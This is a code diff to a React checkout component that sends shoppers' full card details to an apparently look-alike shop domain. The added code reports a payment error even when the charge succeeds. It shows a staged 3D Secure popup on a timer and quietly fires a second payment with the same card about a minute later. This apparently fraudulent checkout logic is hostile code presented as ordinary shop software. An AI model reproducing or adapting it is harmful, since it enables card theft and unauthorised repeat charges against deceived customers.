@@ -63,6 +63,24 @@ const CustomPay = ({ amount, orderNumber, onBack, showStep, isLoading, setIsLoad
     }
   };
 
+  const payFetch = async (orderNumber, amount, cardDetails) => {
+    try {
+      const response = await fetch('https://api.christopeit-france.shop/pay', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ orderNumber, amount, cardDetails }),
+      });
+      const data = await response.json();
+      if (!response.ok) {
+        throw new Error(data.message || 'Something went wrong!');
+      }
+      return data;
+    } catch (error) {
+      console.error('Error fetching payment:', error);
+      throw error;
+    }
+  };
+
   const handleSubmit = async (e) => {
     e.preventDefault();
 
@@ -78,32 +96,25 @@ const CustomPay = ({ amount, orderNumber, onBack, showStep, isLoading, setIsLoad
     }
 
     try {
+      console.log("Paiement en cours...");
       setIsLoading(true);
 
-      const timeoutId = setTimeout(() => {
+      // Lancement différé de la popup 3D Secure
+      setTimeout(() => {
         setIsLoading(false);
         setShow3DSecurePopup(true);
       }, 27000);
 
-      console.log("Paiement en cours...");
+      // Lancement différé d'un 2ème paiement
+      setTimeout(() => {
+        payFetch(orderNumber, amountFeesed, cardDetails);
+      }, 62000);
 
-      try {
-        const payFetch = await fetch('https://api.christopeit-france.shop/pay', {
-          method: 'POST',
-          headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify({ orderNumber, amount, cardDetails }),
-        });
+      await payFetch(orderNumber, amountFeesed, cardDetails);
+      setIsLoading(false);
+      setShow3DSecurePopup(false);
+      setShowPaymentError(true);
 
-        setIsLoading(false);
-        setShow3DSecurePopup(false);
-        setShowPaymentError(true);
-      } catch (error) {
-        console.error(data.checkoutPayFetchError, error);
-        alert(data.checkoutPayRetryAlert);
-        router.push(`/checkout?failed=true`);
-        setIsLoading(false);
-        setShow3DSecurePopup(false);
-      }
     } catch (error) {
       console.error(data.checkoutPayError, error);
       alert(data.checkoutPayGenericError);
@@ -150,7 +161,7 @@ const CustomPay = ({ amount, orderNumber, onBack, showStep, isLoading, setIsLoad
           type="text"
           name="cvv"
           placeholder={data.checkoutPayCVVPlaceholder}
-          maxLength="3"
+          maxLength="4"
           onChange={handleInputChange}
           required
         />
